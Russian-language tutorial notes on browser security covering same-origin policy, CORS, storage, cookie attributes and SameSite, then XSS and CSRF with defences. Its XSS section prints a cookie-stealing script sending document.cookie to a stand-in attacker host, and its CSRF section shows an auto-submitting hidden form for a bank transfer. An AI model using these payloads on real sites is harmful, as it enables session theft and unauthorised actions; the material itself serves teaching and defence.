# Кросс-доменные запросы (cross-origin)

**[Origin](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Origin)** - заголовок запроса, который сообщает серверу, с какого источника (origin) отправлен запрос. Источник состоит из трёх частей: схема, хост и порт

`Origin: <протокол> "://" <имя_хоста> [ ":" <порт> ]`

Пример:

`Origin: https://developer.mozilla.org`

Этот заголовок нельзя задать или изменить через JavaScript - его полностью контролирует бразуер. Origin отправляется, если метод запроса отличается от GET и HEAD, либо запрос идет на другой источник

> Есть и другие такие заголовки категории [Forbidden headers](https://developer.mozilla.org/ru/docs/Glossary/Forbidden_request_header): Content-Length, Referer, Cookie...

Браузер сравнивает источник страницы, которая делает запрос, с источником целевого URL, и классифицирует запрос либо на same-origin либо на cross-origin

- same-origin - полное совпадение origin
- cross-origin - отличие любого из компонентов: протокола, хоста или порта

Пример - страница загружена с `https://example.com`

| Целевой URL | Результат | Причина |
|---|---|---|
| `https://example.com/api/users` | same-origin | отличается только путь |
| `https://example.com:443/x` | same-origin | порт 443 для https совпадает с дефолтным |
| `http://example.com/api` | cross-origin | другая схема |
| `https://api.example.com/` | cross-origin | другой хост (поддомен) |
| `https://example.com:8443/` | cross-origin | другой порт |

# Способы соврешения интернет-запросов в барузере (Web APIs)

| Способ | Что это такое | Пример |
|---|---|---|
| **Навигация** | Браузер загружает новую страницу целиком, когда вы переходите по ссылке, вводите адрес или нажимаете «назад». Текущая страница заменяется новой. | Клик по ссылке `<a href="/about">` |
| **HTML-форма** | Браузер собирает поля формы и отправляет их на сервер по нажатию кнопки. Обычно после этого открывается страница с ответом сервера. | `<form method="POST" action="/login">` |
| **XMLHttpRequest (XHR)** | Старый JavaScript-объект для запросов к серверу в фоне. Страница остаётся на месте, а данные приходят и обновляют её часть. | `xhr.open('GET', '/api/users')` |
| **Fetch API** | Современная замена XHR. Работает на промисах (`then`, `await`) и пишется короче и понятнее. | `const r = await fetch('/api/users')` |
| **Встраивание ресурсов** | Браузер сам запрашивает картинки, скрипты, стили, шрифты и видео, которые указаны в HTML и CSS. Код для этого писать не нужно. | `<img src="logo.png">`, `<script src="app.js">` | 
| **WebSocket** | Постоянное двустороннее соединение с сервером. Обе стороны отправляют сообщения в любой момент. Подходит для чатов и онлайн-игр. | `new WebSocket('wss://chat.example.com')` |

Запросы выполняются в разных режимах [объекта Request](https://developer.mozilla.org/en-US/docs/Web/API/Request/mode). Режим используется для определения того, приводят ли кросс-доменные запросы к допустимым ответам и какие свойства ответа доступны для чтения. В большинстве случаев режим выбирает браузер по типу запроса, но также им можно управлять в `fetch()` и `new Request()`
- same-origin - запрещает кросс-доменные запросы
- no-cors - отключает CORS для кросс-доменных запросов, заголовки и текстовая часть ответа недоступны для JavaScript. Используется для встраивания ресурсов: `<img>`, `<script>`, `<link rel="stylesheet">`, `<video>`
- cors - использует CORS. Дефолтный мод. По умолчанию такие запросы заблокированы (ответ прочитать не получится для простых запросов и отправить запрос не получится для сложных)
- navigate - браузер создаёт такой запрос только при переходе между документами. Из JavaScript его не создать. Примеры: переходы, формы, iframe, `location.href`, `window.open`

Браузерные политики накладывают ограничения на эти API

# SOP - Same-origin policy

Дефолтная политика браузера, которая ограничивает взаимодействие документов и скриптов с одного источника с ресурсами из другого источника. 

> Взаимодействие - совершение интернет запросов (включая встраивание объектов), работа с data storage, общение между объектами Window (page, iframe, popup)

Кросс-доменные взаимодействия делятся на три типа:

| Тип | Примеры | По умолчанию |
|---|---|---|
| Запись | Вставка URL в браузер, refresh page, переход по ссылке `<a>`, редирект, отправка форм, простые запросы (GET, POST или HEAD) `fetch` и XHR | разрешено |
| Встраивание | `<img>`, `<script>`, `<link>`, `<iframe>`, `<video>`, шрифты | разрешено |
| Чтение | получение скриптом доступа к ответу на AJAX-запрос к серверу через XMLHttpRequest или Fetch API, чтение DOM чужого `<iframe>`, чтение содержимомого встроенных ресурсов | **запрещено** |

# CORS - Cross-origin resource sharing

Технология для обхода ограничения SOP. По умолчанию SOP не даст прочитать ответ на кросс-доменный запрос, CORS обеспечивает возможность предоставлять веб-страницам с другим origin’ом доступ к ресурсам данного сервера (читать ответ на простые запросы и выполнять непростые). Это относится в fetch-запросам (и любым в режиме cors), но не относится к встраиванию ресурсов. Заголовок Аccess-control-allow-origin (белый список) позволяет дать разрешение браузеру на доступ js к выполненю запроса и чтению ответа. 

> Если кросс-доменные запросы к вашему сайту не нужны, не нужно включать CORS!

**Простой запрос** - GET, POST или HEAD запрос, содержащий только заголовки [`Accept`,`Accept-Language`,`Content-Language`,`Content-Type` со значением `application/x-www-form-urlencoded`, `multipart/form-data` или `text/plain`] (+ заголовки браузера [`Connection`, `User-Agent`]), может быть сделан через `<form>` или `<script>`, без специальных [методов для сетевых запросов](https://learn.javascript.ru/fetch-crossorigin). 

**Непростой запрос** - любой другой. Перед непростым запросом браузер посылает предзапрос `OPTIONS` с заголовками, и получает ответ с заголовками. Если запрос попадает под белые списки сервера, то он будет отправлен. Иначе запрос даже не будет отправлен. Непростые запросы меняют состояние, поэтому ограничены дополнительно

```
1. Браузер → сервер:  OPTIONS /api/item
                      Origin: https://app.example.com
                      Access-Control-Request-Method: DELETE

2. Сервер → браузер:  204
                      Access-Control-Allow-Origin: https://app.example.com
                      Access-Control-Allow-Methods: DELETE

3. Браузер → сервер:  DELETE /api/item   (настоящий запрос)
```

## Заголовки запроса

| Заголовок | Назначение | Пример |
|---|---|---|
| `Origin` | Источник страницы, с которой отправлен запрос. Добавляется при запросах на другой источник и при методах кроме GET и HEAD | `Origin: https://app.example.com` |
| `Access-Control-Request-Method` | HTTP-метод основного «непростого» запроса, который браузер собирается отправить | `Access-Control-Request-Method: PUT` |
| `Access-Control-Request-Headers` | Список «непростых» заголовков основного запроса | `Access-Control-Request-Headers: content-type, x-token` |

## Заголовки ответа

| Заголовок | Назначение | Пример |
|---|---|---|
| `Access-Control-Allow-Origin` | Источник, которому разрешено читать ответ. Значения: конкретный origin, `*` (любой источник) или `null`. Значение `*` несовместимо с запросами с куками | `Access-Control-Allow-Origin: https://app.example.com` |
| `Vary` | Общий HTTP-заголовок. Значение `Origin` сообщает кэшам (браузерному, CDN, прокси), что ответ зависит от заголовка `Origin` в запросе. Нужен, когда сервер подставляет разные значения `Access-Control-Allow-Origin` | `Vary: Origin` |
| `Access-Control-Allow-Methods` | Методы, которые сервер разрешает для кросс-доменных запросов | `Access-Control-Allow-Methods: GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Заголовки запроса, которые сервер принимает (белый список) | `Access-Control-Allow-Headers: content-type, authorization` |
| `Access-Control-Max-Age` |  Время кэширования результата preflight в секундах | `Access-Control-Max-Age: 7200` |
| `Access-Control-Allow-Credentials` | Сервер согласен принять запрос с куками и авторизационными данными. Допустимо только значение `true`. Клиент включает передачу через `credentials: 'include'` (fetch) или `withCredentials` (XHR) | `Access-Control-Allow-Credentials: true` |
| `Access-Control-Expose-Headers` | Заголовки ответа, доступные JavaScript. По умолчанию читаются только `Cache-Control`, `Content-Language`, `Content-Length`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma` | `Access-Control-Expose-Headers: X-Request-Id, ETag` |

## Запросы с Cookie
- Если на Простой запрос с куками не вернулось `Access-Control-Allow-Credentials: true`, то SOP заблокирует чтение ответа. Если вернулось `Access-Control-Allow-Credentials: true`, то можно читать ответ
- Если запрос с авторизацией, то серверу запрещено указывать в [`Access-Control-Allow-Origin`, `Access-Control-Allow-Headers`, `Access-Control-Allow-Methods`] `*`, иначе будет ошибка - SOP заблокирует доступ к ответу. То есть серверу нужно явно разрешить конкретный домен, метод и заголовок для кросс-доменного запроса с Cookie

# Способы хранить данные в браузере

## Cookie

- Размер: около 4 КБ на одну куку
- Браузер автоматически отправляет куки на сервер с каждым подходящим запросом
- Своя логика определения origin - область видимости задается доменом и путем (схема и порт не участвуют)
- `HttpOnly` скрывает куку от JavaScript (`document.cookie` ее не видит)

### Сторонние куки (third-party cookies)

- Пример: на моём сайте встроена картинка с другого источника. При заходе пользователя сервер картинки сохраняет в его браузере свою куку. Дальше эта кука уходит на сервер картинки с каждого сайта, где она встроена, и получается межсайтовый трекинг.
- Браузеры имеют механизмы защиты - Safari блокирует сторонние куки по умолчанию, Firefox разделяет их по сайту верхнего уровня. Обычно пользователь может отключить сторонние куки в настройках: "никогда не принимать сторонние файлы cookie"

## Память JavaScript

- Переменные и объекты живут, пока жив документ
- Данные исчезают при перезагрузке страницы и закрытии вкладки

## Web Storage (localStorage и sessionStorage)

- Словарь «ключ-значение», хранятся только строки
- Лимит около 5 МБ на источник (в разных браузерах 5–10 МБ)
- **SOP.** Хранилище привязано к источнику (схема + хост + порт). Разные протоколы, поддомены и порты дают разные хранилища, и они не видят данные друг друга.
- **Контекст выполнения.** Скрипт из `<script>` выполняется с источником страницы, в которую подключён, независимо от того, откуда загружен файл. Код внутри `<iframe>` работает с хранилищем источника самого iframe
- **Сторонний iframe.** Если браузер блокирует сторонние куки, такой iframe может потерять доступ даже к своему хранилищу (ошибка `SecurityError`)
- **Безопасность.** Любой JavaScript на странице читает Web Storage, поэтому токены и конфиденциальные данные там хранить не нужно

### localStorage

- Данные сохраняются после обновления страницы, закрытия вкладки и перезапуска браузера
- Хранилище одно на все вкладки одного источника

### sessionStorage

- Данные переживают обновление страницы и удаляются при закрытии вкладки или браузера
- Хранилище существует только в рамках одной вкладки. Одна и та же страница в двух вкладках получает два независимых хранилища

## IndexedDB

- Транзакционная БД с асинхронным чтением и записью, индексами и поиском по ключам. Подходит для больших и структурированных данных, хранит объекты и файлы
- **SOP.** У каждого источника свой набор баз данных, у каждой базы есть имя

## Cache API

- Хранит пары «запрос → ответ», используется в основном с Service Worker для офлайн-режима
- **SOP.** Источник может содержать несколько именованных кэшей
- Автоматического срока жизни у записей нет. Их удаляет код или браузер при нехватке места

# Cookie Security

Пример заголовка ответа сервера:

```http
Set-Cookie: __Host-sid=a1b2c3; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

## Атрибуты - защита значения куки

| Атрибут | Пример | Роль | Замечания по безопасности |
|---|---|---|---|
| `Domain` | `Domain=example.com` | Задаёт домен, на который отправляется кука. Если атрибут указан, кука уходит на домен и все его поддомены. Если атрибута нет, кука привязана только к точному хосту (host-only). | Указание `Domain` расширяет область действия куки на все поддомены. Уязвимый или подконтрольный злоумышленнику поддомен получает доступ к такой куке и может подменить её. Без необходимости атрибут лучше не задавать |
| `Path` | `Path=/app` | Ограничивает кражу по префиксу пути: кука отправляется только на URL, путь которых начинается с указанного. | Границей безопасности `Path` не считается. Скрипт одного пути на том же источнике может прочитать куки другого пути, например через iframe. Атрибут нужен для организации, защиты он не даёт. |
| `Expires` | `Expires=Wed, 21 Oct 2026 07:28:00 GMT` | Абсолютная дата, когда кука удаляется |  |
| `Max-Age` | `Max-Age=3600` | Срок жизни в секундах от момента получения. Имеет приоритет над `Expires`. | Чем короче срок жизни сессионной куки, тем меньше окно для использования украденной. Значение `0` или отрицательное удаляет куку |
| `Secure` | `Secure` | Кука отправляется только по HTTPS | Защищает от перехвата в открытой сети (MITM, публичный Wi-Fi). Современные браузеры не дают HTTP-странице перезаписать `Secure`-куку. Обязателен для `SameSite=None` и префиксов |
| `HttpOnly` | `HttpOnly` | Кука недоступна для JavaScript (`document.cookie` её не показывает). Браузер по-прежнему прикладывает её к запросам. | Защищает от кражи куки при XSS. Атака при этом остаётся возможной: скрипт злоумышленника может отправлять запросы от имени пользователя, и браузер приложит куку сам. Ставится только на серверной стороне через `Set-Cookie` |

## Префиксы

| Префикс | Пример | Роль | Замечания по безопасности |
|---|---|---|---|
| `__Secure-` | `__Secure-id=...` | Браузер принимает куку с таким именем, только если она установлена по HTTPS с атрибутом `Secure`. | Гарантирует, что кука не могла быть записана небезопасной страницей |
| `__Host-` | `__Host-sid=...` | Браузер принимает куку только с `Secure`, `Path=/` и без `Domain`, установленную по HTTPS. Кука получается привязанной к одному хосту. | Самый строгий вариант. Поддомен не может перезаписать такую куку (атака cookie tossing, фиксация сессии). Рекомендуется для сессионных идентификаторов |

## Same-Site cookies

**Same-Site** - дефолтная браузерная технология, ограничивающая для Cross-Site запросов отправку кук. SOP ограничивает получение ответа на междоменные запросы, но в запросы все еще подставляются куки, и это может привести к CSRF. Для защиты придуманы anti-CSRF токены и Same-Site технология

Same-Site управляет отправкой куки в запросах, которые инициирует другой сайт. Определяется по регистрируемому домену, eTLD+1

**Registered domain источника (`eTLD+1`)** - это [host public suffix](https://publicsuffix.org/list/public_suffix_list.dat) плюс одна метка слева от него (`effective top-level domain plus one`)

| Url | Публичный суффикс | eTLD+1 |
|---|---|---|
| `https://www.example.com` | com | `example.com` |
| `https://me.example.com` | com | `example.com` |
| `https://me.github.io` | github.io | `me.github.io` |
| `https://a.b.example.co.uk` | co.uk | `example.co.uk` |

**same-origin**
: совпадают схема, хост и порт (основа SOP)

**same-site** 
: совпадают eTLD+1 и схема. Порт не учитывается

**`SameSite`** 
: атрибут куки, который определяет, отправлять ли ее в кросс-сайтовых запросах:

- **Strict**: кука уходит только при запросах с того же сайта
- **Lax**: кука дополнительно уходит при переходе по ссылке верхнего уровня методом GET - значение по умолчанию 
- **None**: кука уходит всегда (если не ограничено другой политикой), требуется `Secure`

Поэтому:

- Для сессионных кук ставьте `HttpOnly; Secure; SameSite=Lax` (или `Strict`) и префикс `__Host-`
- `HttpOnly` защищает только от кражи куки скриптом
- `SameSite` работает как второй слой против CSRF. Для изменяющих запросов оставляйте CSRF-токены или проверку заголовка `Origin`
- Атрибут `Domain` указывайте, только когда куку нужно делить между поддоменами. Все поддомены должны быть под вашим контролем

# Уязвимости

## XSS

### Что такое XSS

Межсайтовый скриптинг (XSS, cross-site scripting) — это атака внедрением кода, которая позволяет злоумышленнику выполнить вредоносный JavaScript в браузере другого пользователя

Злоумышленник атакует жертву опосредованно. Он использует уязвимость сайта, который посещает жертва, чтобы сайт сам доставил вредоносный JavaScript. Для браузера жертвы вредоносный код выглядит законной частью сайта, и сайт становится невольным сообщником злоумышленника

### Как внедряется вредоносный JavaScript

Единственный способ выполнить вредоносный JavaScript в браузере жертвы — внедрить его в одну из страниц, которые жертва загружает с сайта. Это возможно, если сайт включает пользовательский ввод в свои страницы напрямую: тогда злоумышленник может подставить строку, которую браузер жертвы обработает как код

В примере ниже простой серверный скрипт выводит последний комментарий на сайте:

```
print "<html>"
print "Latest comment:"
print database.latestComment
print "</html>"
```

Скрипт исходит из того, что комментарий состоит только из текста. Но поскольку пользовательский ввод вставляется напрямую, злоумышленник может отправить такой комментарий: `<script>...</script>`. Любой пользователь, открывший страницу, получит следующий ответ:

```
<html>
Latest comment:
<script>...</script>
</html>
```

Когда браузер пользователя загружает страницу, он выполняет любой JavaScript-код внутри тегов `<script>`. Атака злоумышленника удалась

### Чем опасен вредоносный JavaScript

На первый взгляд возможность выполнить JavaScript в браузере жертвы может не казаться особенно опасной. В конце концов, JavaScript работает в сильно ограниченной среде с крайне ограниченным доступом к файлам пользователя и операционной системе. Вы можете прямо сейчас открыть JavaScript-консоль браузера и выполнить любой код, и вряд ли причините вред своему компьютеру

Но опасность становится очевидной, если учесть следующие факты:

- JavaScript имеет доступ к части конфиденциальной информации пользователя, например к кукам
- JavaScript может отправлять HTTP-запросы с произвольным содержимым на произвольные адреса через `XMLHttpRequest` и другие механизмы
- JavaScript может произвольно изменять HTML текущей страницы с помощью методов работы с DOM

### Последствия выполнения вредоносного JavaScript

Среди прочего возможность выполнять произвольный JavaScript в браузере другого пользователя позволяет злоумышленнику проводить следующие виды атак:

**Кража кук**
: Злоумышленник может прочитать куки жертвы, связанные с сайтом, через `document.cookie`, отправить их на свой сервер и использовать для получения конфиденциальной информации, например идентификаторов сессий. Аналогично - localStorage, sessionStorage и другие хранилища

**Кейлоггинг**
: Злоумышленник может зарегистрировать обработчик клавиатурных событий через `addEventListener` и отправлять все нажатия клавиш пользователя на свой сервер. Так можно записать конфиденциальные данные, например пароли и номера банковских карт

**Фишинг**
: Злоумышленник может вставить в страницу поддельную форму входа с помощью методов работы с DOM, задать её атрибуту `action` адрес своего сервера и обманом заставить пользователя отправить конфиденциальную информацию

**Любые действия от имени клиента**
: Может привести к любым доступным действиям от лица клиента (в его контексте) - можно заставить пользователя нажать кнопку под его сессией, нарисовать ему фишинг-форму, сменить пароль, прочитать любые данные, доступные пользователю, захватить учетные данные пользователя

**Дефейс**
: Дефейс веб-сайта, внедрение фишинговой функциональности

Прежде чем подробно описать, как работает XSS-атака, определим её участников. В общем случае в XSS-атаке участвуют три стороны: **сайт**, **жертва** и **злоумышленник**.

- **Сайт** отдаёт HTML-страницы пользователям, которые их запрашивают. В наших примерах он находится по адресу `http://website/`.
  - **База данных сайта** хранит часть пользовательского ввода, включённого в страницы сайта.
- **Жертва** — обычный пользователь сайта, который запрашивает страницы через браузер.
- **Злоумышленник** — недобросовестный пользователь сайта, который собирается атаковать жертву через XSS-уязвимость сайта.
  - **Сервер злоумышленника** — веб-сервер под контролем злоумышленника, созданный единственно для кражи конфиденциальной информации жертвы. В наших примерах он находится по адресу `http://attacker/`.

### Пример сценария атаки

В этом примере предположим, что конечная цель злоумышленника — украсть куки жертвы через XSS-уязвимость сайта. Для этого нужно, чтобы браузер жертвы обработал следующий HTML-код:

```
<script>
window.location='http://attacker/?cookie='+document.cookie
</script>
```

Этот скрипт перенаправляет браузер пользователя на другой URL, что вызывает HTTP-запрос к серверу злоумышленника. В URL куки жертвы передаются параметром запроса, и злоумышленник извлекает их из запроса, когда тот приходит на его сервер. Получив куки, он может выдавать себя за жертву и проводить дальнейшие атаки.

Далее этот HTML-код называется **вредоносной строкой** или **вредоносным скриптом**. Важно отметить, что сама строка становится вредоносной, только если в итоге браузер жертвы разберёт её как HTML, а это возможно лишь из-за XSS-уязвимости сайта.

#### Как работает пример атаки

Диаграмма ниже показывает, как злоумышленник может провести эту атаку:

![Схема постоянной (persistent) XSS-атаки](https://excess-xss.com/persistent-xss.png)

1. Злоумышленник с помощью одной из форм сайта вставляет вредоносную строку в базу данных сайта.
2. Жертва запрашивает страницу у сайта.
3. Сайт включает вредоносную строку из базы данных в ответ и отправляет его жертве.
4. Браузер жертвы выполняет вредоносный скрипт из ответа и отправляет куки жертвы на сервер злоумышленника.

### Защита от XSS

Для успешной XSS-атаки злоумышленник должен иметь возможность внедрить и выполнить вредоносный код на веб-странице. Таким образом, все переменные в веб-приложении должны быть защищены

**Фильтрация/экранирование/кодирование выходных данных в представлении в соответствии с контекстом**

> Кодирование/экранирование - превращение служебных символов в текст, например, `<` кодируется как `&lt;`

> Фильтрация - валидация значений по белому списку

C помощью функций бэкенда:
- Java: `StringEscapeUtils.escapeHtml4() // commons.apache.org`
- PHP: `htmlentities()`

C помощью функций шаблонизаторов:
- Java Thymeleaf : `${fn:escapeXml(value)}`
- Java JSP: `<p th:text="${value}"></p>`

Фреймворки:
- Angular/React - по умолчанию включена кодировка, если не использовать особые функции, например, `DangerouslySetInnerHTML`

### Смягчение XSS

- Content Security Policy (CSP)
- HTTP-only cookie
- X-Content-Type-Options: nosniff

## CSRF - Cross-site request forgery

Атака на пользователя, авторизованного в системе, с целью добиться выполнений действий (отправки запросов) от его лица. Может возникнуть при использовании любых учетных данных, которые браузер добавляет сам: куки, HTTP Basic-аутентификация и др.

> Токен, который JavaScript добавляет в заголовок Authorization вручную (например, Bearer из localStorage), к CSRF не уязвим, потому что чужая страница не может подставить такой заголовок. Зато такой токен можно украсть через XSS

Браузер сам добавляет к запросу куки, если это разрешает атрибут SameSite. Сервер принимает запрос за действие пользователя. SOP закрывает атакующему ответ, но запрос всё равно выполняется, поэтому под угрозой операции, меняющие состояние сервера: перевод средств, смена почты и пароля.

### Пример

В приведенном ниже примере пользователь предварительно авторизовался в системе банка, и браузер сохранил соответствующий файл cookie сеанса. На странице присутствует элемент `<form>`, позволяющий пользователю перевести средства другому лицу. При отправке формы браузер передает на сервер POST-запрос, содержащий данные из этой формы. Если пользователь авторизован, запрос включает его файл cookie. Сервер проверяет cookie и выполняет требуемое действие — в данном случае перевод денег:

![Схема](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF/form-post.svg)

При CSRF-атаке злоумышленник создает веб-сайт, содержащий форму. Атрибут action этой формы указывает на сайт банка, а сама форма содержит скрытые поля ввода, имитирующие поля банка. На странице также содержится код JavaScript, который отправляет форму при загрузке страницы:

```js
<form action="https://my-bank.example.org/transfer" method="POST">
  <input type="hidden" name="recipient" value="attacker" />
  <input type="hidden" name="amount" value="1000" />
</form>
const form = document.querySelector("form");
form.submit();
```

Когда пользователь посещает страницу, браузер отправляет форму на сайт банка. Поскольку пользователь авторизован в системе банка, запрос может содержать его действительный файл cookie; в результате сервер банка успешно проверяет запрос и переводит средства:

![Схема](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF/csrf-form-post.svg)

### Защита

- Атрибут `SameSite=Lax` или `Strict` на сессионной куке
- anti-CSRF токен в каждом изменяющем запросе 
- Запросы, изменяющие состояние, не были simple requests в терминах CORS; в этом случае междоменные запросы будут блокироваться по умолчанию
- Повторное подтверждение (пароль, 2FA) для критичных операций
- Использовать явные системы аутентификации (jwt в header)

**anti-CSRF Synchronizer token (Statefull)** - сервер генерирует один токен на сессию (или на запрос) и отдает его внутри HTML (например, Spring MVC генерирует html представление) или в HTTP-заголовке или как JSON ответ (главное, не в куках). Обратно на сервер в теле (в форме) или заголовке запроса (AJAX).

1. Пользователь открывает страницу банка. Сервер создаёт случайный токен, сохраняет его в сессии и вставляет в страницу.
2. При отправке формы браузер сам прикладывает куку сессии, а токен уходит из поля формы. Сервер сравнивает токен из запроса с токеном в сессии, они совпадают, операция выполняется.
3. Атакующая страница evil.com тоже может отправить запрос на банк, и кука уйдёт автоматически (если SameSite это допускает). Токена в запросе будет не хватать, потому что атакующий не может его получить:
4. Угадать нельзя. Токен случайный и достаточно длинный (от 128 бит).
Прочитать нельзя. Токен лежит в HTML страницы bank.com. SOP запрещает чужой странице читать ответ и DOM другого источника.
